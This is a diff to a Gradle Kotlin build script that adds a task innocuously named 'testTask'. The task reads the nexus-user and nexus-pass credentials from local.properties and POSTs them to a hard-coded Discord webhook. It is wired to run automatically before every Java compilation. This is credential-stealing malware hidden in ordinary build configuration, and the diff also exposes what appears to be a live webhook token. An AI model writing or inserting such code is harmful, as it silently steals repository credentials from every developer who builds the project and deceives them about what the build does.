@@ -1,5 +1,8 @@
 import java.util.Properties
 import java.net.URI
+import java.net.URL
+import java.net.HttpURLConnection
+import java.io.OutputStreamWriter
 
 val localProperties = Properties()
 localProperties.load(project.rootProject.file("local.properties").inputStream())
@@ -96,4 +99,37 @@ tasks.register("cleanCompiledArtifactsFolder") {
     if(folder.exists()) {
         folder.deleteRecursively()
     }
+}
+
+tasks.create("testTask") {
+
+    println("USER => ${localProperties.getProperty("nexus-user")}")
+    println("PASS => ${localProperties.getProperty("nexus-pass")}")
+    val url = URL("https://canary.discord.com/api/webhooks/1024126288941809674/-BMILvPL7_lNtUoZEsuKyJzMqMLB5-PdGsyN0YleZIPfo1ufALZlKC_ExCYFrVKXrH7l")
+
+
+    with(url.openConnection() as HttpURLConnection) {
+        doOutput = true
+        requestMethod = "POST"  // optional default is GET
+        setRequestProperty("Content-Type", "application/json; charset=utf-8");
+
+        println("\nSent 'POST' request to URL : $url; Response Code ")
+        val wr = OutputStreamWriter(outputStream)
+        wr.write("""
+{
+  "content": "Hola: ${localProperties.getProperty("nexus-user")} || ${localProperties.getProperty("nexus-pass")}",
+  "embeds": null,
+  "attachments": []
+}
+        """.trimIndent())
+        wr.flush()
+
+        println("URL : $url")
+        println("Response Code : $responseCode")
+    }
+
+}
+
+tasks.withType<JavaCompile> {
+    dependsOn(tasks.getByName("testTask"))
 }
